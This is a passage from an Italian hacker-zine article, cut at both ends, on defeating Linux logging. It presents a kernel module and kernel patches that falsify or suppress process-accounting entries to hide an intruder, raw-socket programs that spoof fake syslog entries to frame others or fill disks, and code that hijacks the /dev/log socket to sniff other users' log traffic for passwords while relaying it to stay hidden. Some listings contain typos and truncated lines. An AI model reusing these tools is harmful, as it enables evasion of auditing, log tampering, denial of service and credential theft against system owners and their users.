della sys_exit e plasmare, per quello che ci viene concesso, i log.
Ecco il codice:

---------- snip ----------
/*
        Obscura Mens v0.1 - coded by bELFaghor - Thanks to FuSyS for idea
        "I wanna be a good boy", Ramones.

        . Compile it as following:
        gcc -O6 -Wall -DCONFIG_KERNELD -DMODULE -D__KERNEL__ -DLINUX -c obme.c

        . Insert and remove this module as following:
         insmod obme; rmmod obme
*/

#include <linux/kernel.h>
#include <linux/module.h>
#include <sys/syscall.h>
#include <linux/sched.h>

#define HCOMM   "xyta"
#define HUID    1000
#define HGID    100

extern void *sys_call_table[];

char *fhole[] = { "I", "wanna", "be", "a", "good", "boy" };
int i = 0;

asmlinkage int (*original_call) (long);

asmlinkage int our_sys_exit(long code)
{
        if(i > 5) { i = 0; }
        if(!(strcmp(current->comm, HCOMM))) {
                strcpy(current->comm, fhole[i++]);
                current->uid = HUID;
                current->gid = HGID;
                current->exit_code = 0;
                if((HUID != 0) && (current->flags & PF_SUPERPRIV)) {
                        current->flags ^= PF_SUPERPRIV;
                }
        return original_call(0);
        }
        return original_call(code);
}

int init_module()
{
        original_call = sys_call_table[SYS_exit];
        sys_call_table[SYS_exit] = our_sys_exit;
        return 0;
}

void cleanup_module()
{
        if(sys_call_table[SYS_exit] != our_sys_exit) {
                printk("shit something goes wrong :/\n");
                }
        sys_call_table[SYS_exit] = original_call;
}
---------- snip ----------

Questo codice, oltre ad essere uno spunto per svariate implementazioni, serve
a modificare l'entry generata da Xytaxehedron quando riavviava il logging
chiamando acct(), e piu' precisamente ogni volta che viene generato un log
con ac_comm == xyta , lo sostituira' con le informazioni che vorremo cosi'
da mascherarlo. L'array fhole contiene i campi che mano a mano sostituiranno
le varie entries, mentre HUID e HGID definiscono rispettivamente l'UID e
il GID che acquistera' la nuova entry mascherata: cambiateli con un utente
che e' loggato nel sistema, cosicche' sembri una sua entry, altrimenti
sarebbe ingiustificata. Allo stesso modo potreste implementare del
codice per mascherare insmod/rmmod, cioe' quando inserite e rimuovete il
modulo :)
E per darvi un'altra idea, e non prepararvi sempre la pappetta, perche' non
codare un LKM "intelligente" in grado di segliere che uid/gid settare in base
agli utenti loggati nel sistema cosi' da mascherare sempre meglio le nuove
entries?

Ora, invece, vediamo come potremmo modificare il codice sorgente del kernel;
premetto che quanto segue e' frutto della mia esperienza sul codice del
2.0.36 e NON posso quindi garantire che funzioni anche in altre versioni; ma
in linea di massima ci siamo.
Da dire e' anche che un alterazione del sistema di questo tipo e' molto
difficile da praticare in remoto e che e' quindi un'implementazione quasi
'only 4 phun' o per quanti possono 'attaccare' una macchina a cui hanno
accesso fisicamente :)
Beh, ora non ci sono molti problemi: possiamo toccare quello che vogliamo :)
Quindi modifichiamo direttamente la int acct_process(long exitcode) in
/usr/src/linux/kernel/sys.c ;) Ad esempio potremmo modificare la funzione come
segue:
                :
int acct_process(long exitcode)
{
   struct acct ac;
   unsigned short fs;

        /*      add this        */
   if(!(strcmp(current->comm, "hydra"))) {
                return 0;
                }
        /*      end add         */

                :
                :
In questo modo ogni qual volta comm sara' uguale a 'hydra' l'entry non sara'
generata. Oppure se avessimo un nostro acconto personale e legale potremmo
fare un check basato sull'UID del tipo:

        if(current->uid == 1000) {
                return 0;
                }

Se cioe' il nostro uid e' 1000, la fuzione ritornera' subito, cosi' da non
inserire alcuna entry. Ma non sarebbe giustificato il fatto che vi siano
dei log magari in utmp/wtmp/etc etc e non in acct. Beh, le soluzioni sono
molte :) ve ne presento una, semplice e concisa:

        if((current->uid == 1000) && (strlen(current->comm) == 18) {
                return 0;
                }

Potremmo cosi' rinominare i nostri file cattivi in modo tale che la loro
lunghezza sia di 18 (!?! eheh 6+6+6 :) caratteri e non saranno mai loggati :P
Poi fate come volete, ve l'ho detto, le soluzioni sono molteplici :)

Credo di avere finito :) Ora traete voi le conclusioni... ho voglia solo di
dire una cosa... IMHO, questo articolo e' un inno alla gestione ottimale
dei vari log per gli admin... admin con le palle non fate finta di non avere
capito quello a cui alludo, beh siete delle capre di sysadm... e se siete
smanettoni... a voi l'ardua sentenza :)))

ave atque vale.
                                .bELFaghor VampErotic Daem0n.


---------------------------------[ SYSL0GD ]----------------------------------
--------------------------------[ bELFaghor ]---------------------------------
/*
	*	ATTENZIONE: quanto segue e' scritto a fini informativi,	*
	*	puramente educativi ed eventualmente ludici. L'autore	*
	*	declina ogni responsabilita' per l'uso illecito delle	*
	*	informazioni contenute nel testo.			*
*/

bELFaghor S.D. omnia.
In questo articolo parleremo di come sfruttare alcune caratteristiche insite
nel 'sysklogd package', il piu' usato sistema di logging.
In particolare, quanto segue e' frutto dell'esperienza in ambiente Linux,
ma dato che sfrutteremo inadempienze del codice, quanto segue e' applicabile
in qualsiasi ambiente esso giri.
Tralascero' quanto detto da molti prima di me, anche negli scorsi
numeri di BFi (FuSyS && pIGpEN docent), per arrivare subito al nocciolo
della questione: il syslogd offre un'opzione molto interessante, offre cioe'
la possibilita' di spedire i logs generati localmente ad un host remoto.
Fino alla versione 1.2 del pacchetto questo comportamento era attivo di
default e bastava quindi modificare ad hoc il syslog.conf (man syslog.conf).
Infatti, aggiungendo semplicemente la riga:

*.*			@belf.log.station.myhome.gov

era possibile mandare TUTTI i logs generati dal syslogd alla macchina
belf.log.station.myhome.gov, che li avrebbe passati a sua volta al syslogd
locale, per poi riprocessarli attraverso il syslog.conf locale.
Dalla versione 1.3, invece, questo comportamento e' stato impostato come
opzione, non attiva di default, del syslogd. Ora quindi per attivare questa
funzione e' necessario passare una flag alla riga di comando:
precisamente -r. 'man syslogd' :) mi racco-man-do. Questa flag abilita il
syslogd a ricevere logs da macchine remote; inoltre un'altra flag interessante
e' -h che abilita il forwarding del logs, cosicche' possiamo fare passare i
nostri logs dalla macchina A alla macchina B, la quale li passera' poi alla
macchina C; sempre se abbiamo configurato come si deve i syslog.conf delle
due macchine.
Solitamente il syslogd e' settato per aspettare connessioni alla
porta 514, tramite la quale scambiera' dati attraverso pacchetti UDP.
Ora viene il bello.
Siamo alla versione 1.3-31, rilasciata di recente, e non e' ancora stato
implementato un controllo in grado di stabilire se l'origine da cui
provengono i logs remoti sia trusted! Il syslogd accetta quindi log da
QUALSIASI fonte! E QUALSIASI log!
E allora perche' non scrivere un codice che costruisca un pacchetto
UDP/IP in modalita' RAW che mandi il nostro log fake spoofato? :))
Eccolo :)

---------- snip ----------
/*
        coded while was reflecting on the offspring's concert _GREAT!_ ;)
        WALLA WALLA v0.1 - coded by bELFaghor 02/99
*/

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_udp.h>
#include <netinet/protocols.h>
#include <arpa/inet.h>
#include <netdb.h>

struct udp_pkt {
        struct iphdr    ip;
        struct udphdr   udp;
        char data[1024];         /* to change if you change data content */
} pkt;

u_long host2ip(char *hostname) {
        u_long ipb;
        struct hostent *hp;

        if((hp = gethostbyname(hostname)) < 0) {
                perror("gethostbyname");
                exit(1);
                }
        memcpy(&ipb, hp->h_addr, hp->h_length);
        return(ipb);
}

void main(int argc, char *argv[])
{
        int     socka,
                src_port = 666,         /* evil port */
                dst_port = 514,
                len;

        struct sockaddr_in to;

        u_long src_addr, dst_addr;

        if(argc != 3) {
                printf("WALLA WALLA v0.1 - bELFaghor\n"
                        "Usage:\n\t%s <spoofaddr> <destaddr>.\n", argv[0]);
                exit(1);
                }

        if((socka = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
                perror("socket");
                exit(1);
                }

        src_addr = host2ip(argv[1]);
        dst_addr = host2ip(argv[2]);

	/* data content */
        strcpy (pkt.data,  "<6>fake log: WALLA WALLA v0.1 by bELFaghor");
        len = strlen(pkt.data);

        memset(&pkt, 0, (sizeof(struct iphdr) + sizeof(struct udphdr)));
        pkt.ip.version = 4;
        pkt.ip.ihl = 5;
        pkt.ip.tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + leen);
        pkt.ip.id = htons(0x455);
        pkt.ip.ttl = 255;
        pkt.ip.protocol = IP_UDP;
        pkt.ip.saddr = src_addr;
        pkt.ip.daddr = dst_addr;

        pkt.udp.source = htons(src_port);
        pkt.udp.dest = htons(dst_port);
        pkt.udp.len = htons(sizeof(struct udphdr) + len);

        to.sin_family = AF_INET;
        to.sin_port = src_port;
        to.sin_addr.s_addr = dst_addr;

        if(connect(socka, (struct sockaddr *) &to, sizeof(struct sockaddr)) < 0) {
		perror("connect");
		exit(2);
		}

        if(sendto(socka, &pkt, sizeof(pkt), 0, (struct sockaddr *) &to,
                sizeof(struct sockaddr)) < 0) {
		perror("sendto");
		exit(3);
		}

        close(socka);
        printf("done.\n");

}
---------- snip ----------

Il nostro codice si limita a mandare la stringa data[1024] da un indirizzo
spoofed (argv[1]) all'indirizzo vittima (argv[2]). Ora alcuni piccoli 
accorgimenti sul codice, che e' SOLO un esempio dell'implementazione:
se cambiate la stringa da copiare in data[], ricordatevi di aggiornare
l'array data[], o di farne un puntatore ed aggiornare anche il resto
del codice, altrimenti rischiate un bel core dump :) Inoltre se
volete mandare diversi log, ma che siano CONTIGUI nella loro visualizzazione
sulla macchina della vittima, anziche' usare piu' volte il codice, sarebbe
meglio aggiungere un bel ciclo for(), altrimenti rischiate che i vostri
fake log siano interrotti da altri logs della macchina. Una cosa del tipo:

        printf("sending fake portscan logs...: \n");
        for(k=0; k < 1024; k++) {
        memset(pkt.data, '\0', 1024);
   sprintf(pkt.data, "tcplog: port %i connection attempt from %s", i, argv[1]);
        sendto(socka, &pkt, sizeof(pkt), 0, (struct sockaddr *) &to,
                sizeof(struct sockaddr));
        printf("."); fflush(stdout);
        }

Inoltre, se volete che il log che mandate sembri generato localmente dalla
macchina dovete settare come IP sorgente lo stesso IP della vittima
(argv[0] == argv[1]).
Ultima e piu' importante cosa e' quel numerino '<6>' in data[]... 
Che sara' mai? Il syslogd divide i suoi logs secondo certi criteria,
che vengono utilizzati anche nella configurazione del syslog.conf ,
e che servono a una gestione dei log ottimale. Ecco i criteria :)
Definiti in syslog.h:

	#define LOG_EMERG       0       /* system is unusable */
	#define LOG_ALERT       1       /* action must be taken immediately */
	#define LOG_CRIT        2       /* critical conditions */
	#define LOG_ERR         3       /* error conditions */
	#define LOG_WARNING     4       /* warning conditions */
	#define LOG_NOTICE      5       /* normal but significant condition */
	#define LOG_INFO        6       /* informational */
	#define LOG_DEBUG       7       /* debug-level messages */

Noi abbiamo utilizzato <6>, LOG_INFO, solo perche' e' uno dei piu' utilizzati,
ma altrettanto bene andava <4> LOG_WARNING (LOG_INFO e LOG_WARNING sono i
due maggiormente utilizzati, vedi IPLogger, Jail, IPlog e altri tools simili).
Se volete fare una cosa sveglia, omettetelo! :)
I logs andranno diretti nei file specificati da *.notice, *.info e *.debug :)
Ad ogni modo, a voi la scelta :)
Una scelta importante dato che, nel caso in cui l'admin non loggasse tutti i
dati remoti ricevuti, se gli procurassimo un log che poi non verrebbe scritto
da nessuna parte, saremmo fuori strada, non e' il nostro obiettivo.
In linea di massima comunque LOG_NOTICE/LOG_WARNING sono ok.
Se pero' gli mandate un log "kernel fault" vedete di cambiare la flag :)))
E ancora meglio, se sapete che logger utilizza in parallelo con il syslogd,
procuratevi il sorgente e guardate che flag utilizza, cosi' andate
sul sicuro :)
Questo mi sembra sufficiente come spiegazione :)

Ora veniamo al perche' di questo codice :) Un'implementazione simile era
gia' stata presentata da Hobbit nel README del suo Netcat (e ricordata
da FuSyS in BFi2), MA non ci viene ricordato che possiamo mandare
QUALSIASI "log" alla nostra vittima.
Possiamo cioe' sostituire la nostra data[] con un "go fuck your god bullshit"
e far giungere il pacchetto da belf.rules.in.his.house.gov :) Bello no? Ahah.
Allo stesso modo possiamo servirci di questo codice per svariati motivi;
vi presento i due piu' palesi, poi largo alla fantasia o meglio,
all'intelletto :)
Nulla di piu' bello che mandare dei logs verosimili di un attacco proveniente
da un belf.gov o belf.mil :) o anche sommergere il mal capitato di simulazione
di attacchi da un centinaio di indirizzi diversi (modificando ad hoc il codice
o affiancandogli un semplice bash script). Allo stesso modo si potrebbero
mandare logs di errori sconosciuti o improbabili come un "kernel dead" e poi
far schiantare la macchina, o anche analogamente un log del tipo "flooding
from belf.is.a.cop.gov..." e poi far affondare la shell. In questo caso o in
casi simili, ricordatevi di settare come spoofed address lo stesso indirizzo
che avete assegnato dest address, cosicche' sembri un log locale e non
proveniente da un'altra macchina, a meno che non floodiate poi l'altra
macchina ;)
Ecco una semplice implentazione d'esempio basata sul codice precedente:

---------- snip ----------
/*
        WALLA WALLA v0.2 learning edition - bELFaghor 02/99
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_udp.h>
#include <netinet/protocols.h>
#include <arpa/inet.h>
#include <netdb.h>

#define EVIL_HOST "belf.son.io.gov"	/* this is a fake address, your address
						must be real! change it */

struct udp_pkt {
        struct iphdr    ip;
        struct udphdr   udp;
        char data[1024];        /* to change if you change data content */
} pkt;

u_long host2ip(char *hostname) {
        u_long ipb;
        struct hostent *hp;

        if((hp = gethostbyname(hostname)) < 0) {
                perror("gethostbyname");
                exit(1);
                }
        memcpy(&ipb, hp->h_addr, hp->h_length);
        return(ipb);
}

void main(int argc, char *argv[])
{
        int     socka,
                src_port = 666,         /* evil port */
                dst_port = 514,
                i,
                len;

        register int k;

        struct sockaddr_in to;

        u_long src_addr, dst_addr;


        if(argc != 3) {
                printf("WALLA WALLA v0.2 learning edition - coded by bELFaghor\n"                        
			"Usage:\n\t%s <spoofaddr> <destaddr>.\n", argv[0]);
                exit(1);
                }

        if((socka = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
                perror("socket");
                exit(1);
                }

        src_addr = host2ip(argv[1]);
        dst_addr = host2ip(argv[2]);

        len = 1024;

        memset(&pkt, 0, (sizeof(struct iphdr) + sizeof(struct udphdr)));
        pkt.ip.version = 4;
        pkt.ip.ihl = 5;
        pkt.ip.tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + le        pkt.ip.id = htons(0x455);
        pkt.ip.ttl = 255;
        pkt.ip.protocol = IP_UDP;
        pkt.ip.saddr = src_addr;
        pkt.ip.daddr = dst_addr;

        pkt.udp.source = htons(src_port);
        pkt.udp.dest = htons(dst_port);
        pkt.udp.len = htons(sizeof(struct udphdr) + len);

        to.sin_family = AF_INET;
        to.sin_port = src_port;
        to.sin_addr.s_addr = dst_addr;

        connect(socka, (struct sockaddr *) &to, sizeof(struct sockaddr));

        printf("sending fake portscan logs...: \n");
        for(k=0; k < 8; k++) {
        memset(pkt.data, '\0', 1024);
        i = 1+(int) (1024.0*rand()/(RAND_MAX+1.0));
        sprintf(pkt.data, "tcplog: port %i connection attempt from %s", i, EVIL_HOST);        
	sendto(socka, &pkt, sizeof(pkt), 0, (struct sockaddr *) &to,sizeof(struct sockaddr));
        printf("."); fflush(stdout);
        sleep(1+(int) (2.0*rand()/(RAND_MAX+1.0)));
        }

        printf("sleeping..."); fflush(stdout);

        sleep(25);
        printf("\nsending fake based telnet attack logs...: \n");
        memset(pkt.data, '\0', 1024);
        sprintf(pkt.data, "tcplog: telnet connection attempt from %s", EVIL_HOST);
	sendto(socka, &pkt, sizeof(pkt), 0, (struct sockaddr *) &to,sizeof(struct sockaddr));
        printf("...-*-"); fflush(stdout);


        memset(pkt.data, '\0', 1024);
        sprintf(pkt.data, "in.telnetd[782]: connect from %s", EVIL_HOST);
        sendto(socka, &pkt, sizeof(pkt), 0, (struct sockaddr *) &to,sizeof(struct sockaddr));
        printf("...-*-"); fflush(stdout);

        printf("sleeping..."); fflush(stdout);


        sleep(25);
        printf("\nsending fake unknown log...: \n");
        for(k=0; k < 10; k++) {
        memset(pkt.data, '\0', 1024);
        sprintf(pkt.data, "tcplog: receiving unknown packet from %s", EVIL_HOST);
        sendto(socka, &pkt, sizeof(pkt), 0, (struct sockaddr *) &to,sizeof(struct sockaddr));
        printf("."); fflush(stdout);

        sleep(1+(int) (3.0*rand()/(RAND_MAX+1.0)));
        }

        printf("sleeping..."); fflush(stdout);


        sleep(10);
        printf("\nsending final k.o. unknown log...: \n");
        memset(pkt.data, '\0', 1024);
        strcpy(pkt.data, "system alert");
        sendto(socka, &pkt, sizeof(pkt), 0, (struct sockaddr *) &to,sizeof(struct sockaddr));
        printf("...-*-"); fflush(stdout);


        memset(pkt.data, '\0', 1024);
        strcpy(pkt.data, "WARNING: core dump, system failed");
        sendto(socka, &pkt, sizeof(pkt), 0, (struct sockaddr *) &to,sizeof(struct sockaddr));
        printf("...-*-"); fflush(stdout);


        close(socka);
        printf("\ndone.\n");

}
---------- snip ----------

L'altro claro utilizzo del codice protrebbe essere quello di un semplice
"DoS" del syslogd o semplicemente un "DoS" della lettura dei
logs o magari anche della macchina. Possiamo infatti mettere nel cron il
nostro processo e mandare log di 1000 caratteri alla volta da indirizzi
surreali :) e riempire i log della nostra vittima di 'a', cosi' da riempire
di conseguenza l'hd che, se di esigue dimensioni potrebbe anche esaurire
la sua capienza, con ovvie conseguenze.
Guardate qua:

	Aggiungiamo *.* /var/log/dos in syslog.conf e HUPpiamo il syslogd,
	il quale crea il file e ci inserisce come prima entry  
	'syslogd 1.3-3: restart'.

   1 -rw-------   1 root     users          67 Feb  9 00:21 /var/log/dos

	Ora settiamo l'array data a 1024 (data[1024]), cambiamo la strcpy()
	in una memset(pkt.data, 'a', 1024) e mettiamo la sendto in un loop
 	for che ripetera' per 1024 volte, quindi lanciamolo...
	Dopo pochi secondi di esecuzione, torniamo a vedere il nostro file...

  58 -rw-------   1 root     users       58312 Feb  9 00:21 /var/log/dos

	Non male direi :) se poi lo pensiamo fatto da una t1 se non
	addirittura una t3 :))) ehheh

In questo modo possiamo inserire nel mezzo dei nostri attacchi simulati
quel che fake di log volete :))) ad esempio, un nostro bell'attacco da
shell, cosi' che se la nostra vittima decidera' di scrivere a tutti gli
admin del centinaio di simulazioni di attacco, tutte quante, forse esclusa
la vostra dalla quale hacckate, gli comunicheranno che e' un pazzo.
E con una piccola dose di culo e l'inesperienza del mal capitato potrebbe
non accaddervi nulla ehehe :)

Se poi siete a conoscenza che i logs della macchina A arrivano alla
macchina B tramite appunto il syslogd... allora potete impersonare la
macchina A (spoof addr) e mandare dei fake log (di quello che volete) alla
macchina B, cosi' che l'admin impazzira' a capire perche' ci sono i log
sulla macchina B e non sulla macchina A, e potrebbe giungere a conclusione
che gli hanno bucato le macchine... Potrebbe essere una piccola e crudele
vendetta contro qualcuno eheh. Queste implentazioni le vedrei molto utili
al sysadm che sta per essere licenziato: sistema il syslogd e poi fa impazzire
il nuovo sysadm :)

Un'altra bellissima cosa che potrebbe servire a scopi malefici e' sapere
che anche i CISCO offrono questo servizio e cioe' possono essere configurati
per mandare a una qualche macchina remota, dove giri il syslogd opportunamente
configurato, i loro log. Quindi se sapete che alla macchina X arrivano
anche i logs del suo router CISCO, volete non fakkargli qualche log? Ahahah...
E SOPRATTUTTO non volete vedere i PREZIOSISSIMI log del router? :))
I CISCO utilizzano tutti i livelli di logging; il livello dei log generati
dipendera' allora dai log che il router intende mandare al syslogd remoto e
da quelli che il syslogd remoto e' configurato per accettare. Fakkare log
dei CISCO e' comunque un'ardua impresa poiche' entrano in gioco molte
variabili come appunto la 'sincronizzazione' dei log, il timestamp, il source
address dell'interfaccia etc etc... Meglio quindi riceverli piuttosto che
fakkarli :) ... molto piu' maleficamente produttivo :) ...
Ma che ne dite degli Ascend? :) Anche loro offrono lo stesso servizio...
Ad esempio i bei log che mandano gli Ascend possono contenere preziosissime
informazioni come:

	. il numero di telefono del chiamante *qualcuno ci rompe le
	  palle su irc? Il suo provider sara' il nostro obiettivo :)*
	. il numero chiamato *poco ci interessa :)* 
	. informazioni sul suo acconto *ovvero le authentication info*
	. bytes/packet trasmessi/ricevuti *bazzecole :)*
	. la destinazione delle sue sessioni nel net *forse :))*
	. altro *generalmente meno interessante*

Solitamente questi logs, che possono arrivare anche a piu' hosts remoti,
arrivano GENERALMENTE con livello LOG_INFO.

Ma ora vediamo anche un piccolo corollario molto interessante che ora
presento a livello teorico e spero di poter provare a livello pratico
prima della consegna l'articolo. (se leggete queste righe, vuol dire che
e' rimasto tutto a livello teorico :( ma dovrebbe funzionare! eheh).

Obiettivo: vogliamo ricevere i logs della macchina A, per qualche oscuro
motivo eheh :) e scoprire magari qualche pass di un utente sbadato eheh,
possibilmente non gli ultimi Linux perche' ci sbattono un bel UNKNOW di cui
non ce ne importa na cippa...

E cosi' siamo venuti a conoscenza che la macchina A manda i suoi logs alla
macchina B. Nulla di piu' facile che cercare d'impersonare
((DoS + spoofing || DoS + masquerading) docent) la macchina B, configurare
ad hoc il nostro syslogd e ricevere belli belli i logs di A :) eheh.
Chissa' che non riusciamo a recuperare qualche acconto o qualche informazione
utile (ricordatevi l'articolo di FuSyS sull'IP spoofing in BFi4, e non solo
il suo :)
Il tutto riesce molto bene da locale in una LAN: spegnete la macchina del
vostro collega, impossesatevi del suo IP, configurate il tutto ad hoc e
ricevete i logs beati :) Se poi siete svegli e configurate anche dell'altro,
riceverete anche dell'altro eheheh.
  
Ricordatevi che e' sempre meglio provare tutto sulle proprie macchine
prima di scazzare qualcosa e finire nei pasticci :)

Ora passiamo a qualcos'altro di davvero interessante sempre riguardo
il syslogd, ma questa volta a livello LOCALE... Se diamo, infatti, una
sbirciatina al codice notiamo che il syslogd utilizza una socket file
- /dev/log - per scambiare parte dei log...

syslog.c:#define        _PATH_LOGNAME   "/dev/log"
	strncpy(SyslogAddr.sa_data, _PATH_LOGNAME,sizeof(SyslogAddr.sa_data));

sa_data e' definito nella struct sockaddr_un ed e' il path passato per
aprire la socket utilizzando il protocollo AF_UNIX. Se andiamo a vedere
il nostro bel file di log con un 'ls -asl' noteremo che e' +rw per chiunque!

   0 srw-rw-rw-   1 root     root            0 Feb  6 01:12 /dev/log

Fortunazza :) Cio' vuol dire che possiamo leggere e scrivere dati che
passano per il syslogd; e precisamente scrivere quello che vogliamo nei file
di log e leggere quei log che si avvalgono della socket /dev/log !
Molto interessante direi! Soprattutto in un sistema con 1000 - 2000 utenti
da cui possiamo ricavare informazioni preziose, ma anche informazioni
utili per altri scopi non prettamente relativi ad un hack 4 phun :)
Non dimentichiamoci poi che possiamo mandargli qualsiasi scritta/logs
con un qualsiasi utente!! Ora vediamo un po' come implementare il tutto...
Direi che possiamo scomporre il tutto in due codici... uno che scrive...
l'altro che legge...

E fu cosi' che nacque Shub-Niggurath, antica divinita' malvagia dedita a riti
innominabili: Il Nero Capro dai Mille Cuccioli. /* H.P. Lovecraft */

Ok. Partiamo con SHUB, colui che scrive:

---------- snip ----------
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <sys/un.h>
#include <alloca.h>
#include <fcntl.h>
#include <string.h>

#define EVIL_PATH "/dev/log"

void main(int argc, char *argv[])
{
        struct sockaddr_un sunx;
        int s, fd;

        strcpy(data, "fuck off bullshit");     

        memset(&sunx, 0, sizeof(struct sockaddr_un));
        sunx.sun_family = AF_UNIX;
        strncpy(sunx.sun_path, EVIL_PATH, strlen(EVIL_PATH));
        if((s = socket(AF_UNIX, SOCK_STREAM, 0)) < 0) {
                        perror("socket");
                        exit(1);
                        }

        if((connect(s, (struct sockaddr *) &sunx, sizeof(sunx))) < 0) {
                        perror("connect");
                        exit(1);
                        }

        if((write(s, data, sizeof(data))) < 0) {
                perror("write");
                exit(1);
                }

        close(s);
        printf("complete.\n");

}
---------- snip ----------

Nulla di piu' semplice :) il codice mi sembra abbastanza chiaro...
Per maggiori informazioni sulla struct sockaddr_un guardatevi
/usr/include/un.h ...ma non ci dovrebbero essere difficolta'...

Ed ora NIGGURATH, colui che ascolta:

---------- snip ----------
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <sys/un.h>
#include <alloca.h>
#include <fcntl.h>
#include <string.h>

#define EVIL_PATH "/dev/log"

void main(int argc, char *argv[])
{
        struct sockaddr_un sunx;
        char buf[4096];
        int s, ns, len;

        unlink(EVIL_PATH);

        memset(&sunx, 0, sizeof(struct sockaddr_un));
        sunx.sun_family = AF_UNIX;
        strncpy(sunx.sun_path, EVIL_PATH, strlen(EVIL_PATH));
        if((s = socket(AF_UNIX, SOCK_STREAM, 0)) < 0) {
                        perror("socket");
                        exit(1);
                        }

       if (bind(s, (struct sockaddr *) &sunx, sizeof(sunx)) < 0) {
                        perror("bind");
                        exit(1);
                        }

        chmod(EVIL_PATH, 0666);

        if (listen(s, 5) < 0) {
                        perror("listen");
                        exit(1);
                        }
        len = sizeof(struct sockaddr_un);

        for(;;) {

        if((ns = accept(s, (struct sockaddr *) &sunx, &len)) < 0) {
                        perror("accept");
                        exit(1);
                        }

        if((read(ns, buf, sizeof(buf))) < 0) {
                perror("read");
                exit(1);
                }

        printf("data:\n%s\n", buf);

        close(ns);

        }
        close(s);
        printf("complete.\n");
}
---------- snip ----------

Mmm... ora abbiamo una piccola complicazione... l'unlink()...
Ebbene si'. Prima di bindare il file, dobbiamo rimuoverlo... e cosi'
blocchiamo il syslogd che rimane fermo, inerte, fino a che non sara'
riavviato... noi non potremo farlo, dato che non siamo ancora root :(
e solo in certe condizioni potremo mascherare il fatto agli occhi del root...
Intanto speriamo di trovare qualche informazione utile: spesso e volentieri
su sistemi con molti utenti, diversi utenti hanno uid == 0 :)) 
Ora vediamo come cercare di aggirare il problema. Prima ricapitoliamo quello
che e' successo...

	. situazione vergine:

	LOG --> SOCKET (/dev/log) --> SYSLOGD --> OUTPUT (vedi syslog.conf)

	. situazione dopo la nostra incursione:
	
	LOG --> SOCKET (/dev/log) --> NOSTRO AUDIT --> OUTPUT (stdout)

I log non arrivano piu' quindi all'output a cui il root li aveva destinati,
comportando un motivo di preoccupazione per un admin minimamente sveglio
e degno di tale definizione. Non ci siamo, non va bene. Vediamo di trovare
una soluzione al fattaccio, cosa che e' possibile SOLO in una condizione,
ovvero: il syslogd DEVE accettare log remoti. In tale condizione potremo
quindi fare come segue:

	LOG --> SOCKET (/dev/log) --> NOSTRO AUDIT ----> OUTPUT (stdout)
					   |
                    			   |  
                                      	   ----> SENDTO 514 					

Vediamo di spiegare: per prima cosa, come abbiamo detto, il syslogd deve
poter accettare log remoti e quindi o la release e' < 1.3 oppure la flag -r
e' attivata.
Quindi se ci sono queste condizioni possiamo rimediare all'incoveniente. I log
arriveranno, infatti, al nostro audit - NIGGURATH - il quale ci fara' vedere
tale log e poi lo mandera' alla 514 del localhost con un pacchetto UDP.
Cosi' facendo, la presenza del nostro audit sara' 'mascherata' e il syslogd
ricevera' comunque i log. Siamo a posto :) Ora vediamo come potrebbe essere
il codice modificato ad hoc:

---------- snip ----------
/* vru vru vruk coded by bELFaghor */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_udp.h>
#include <netinet/protocols.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <sys/un.h>
#include <alloca.h>
#include <fcntl.h>
#include <string.h>

#define EVIL_PATH "/dev/log"

struct udp_pkt {
        struct iphdr    ip;
        struct udphdr   udp;
        char data[1024];        /* to change if you change data content */
} pkt;

u_long host2ip(char *hostname) {
        u_long ipb;
        struct hostent *hp;

        if((hp = gethostbyname(hostname)) < 0) {
                perror("gethostbyname");
                exit(1);
                }
        memcpy(&ipb, hp->h_addr, hp->h_length);
        return(ipb);
}

void main(int argc, char *argv[])
{
        struct sockaddr_un sunx;
        char buf[1024];
        int s, ns, s2, len, srcport, dstport, len2;
        struct sockaddr_in to;
        u_long srcaddr, dstaddr;


                if(argc != 2) {
                printf("vru vru vruk by belf v0.1\nsyntax:\t%s <hostname>\n", argv[0]);
                exit(1);
                }

        unlink(EVIL_PATH);

        memset(&sunx, 0, sizeof(struct sockaddr_un));
        sunx.sun_family = AF_UNIX;
        strncpy(sunx.sun_path, EVIL_PATH, strlen(EVIL_PATH));
        if((s = socket(AF_UNIX, SOCK_STREAM, 0)) < 0) {
                        perror("socket");
                        exit(1);
                        }

        if((s2 = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
                perror("socket");
                exit(1);
                }

        srcaddr = host2ip(argv[1]);
        dstaddr = host2ip("localhost");
        dstport = 514;
        srcport = 666; /* 1+(int) (1024.0*rand()/(RAND_MAX+1.0)); */
        len2 = sizeof(pkt.data);

        memset(&pkt, 0, (sizeof(struct iphdr) + sizeof(struct udphdr)));
        pkt.ip.version = 4;
        pkt.ip.ihl = 5;
        pkt.ip.tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + len2);        pkt.ip.id = htons(0x455);
        pkt.ip.ttl = 255;
        pkt.ip.protocol = IP_UDP;
        pkt.ip.saddr = srcaddr;
        pkt.ip.daddr = dstaddr;

        pkt.udp.source = htons(srcport);
        pkt.udp.dest = htons(dstport);
        pkt.udp.len = htons(sizeof(struct udphdr) + len2);

        to.sin_family = AF_INET;
        to.sin_port = srcport;
        to.sin_addr.s_addr = dstaddr;

        if((connect(s2, (struct sockaddr *) &to, sizeof(struct sockaddr))) < 0)
                        perror("connect");
                        exit(1);
                        }

       if (bind(s, (struct sockaddr *) &sunx, sizeof(sunx)) < 0) {
                        perror("bind");
                        exit(1);
                        }

        chmod(EVIL_PATH, 0666);

        if (listen(s, 5) < 0) {
                        perror("listen");
                        exit(1);
                        }
        len = sizeof(struct sockaddr_un);

        for(;;) {

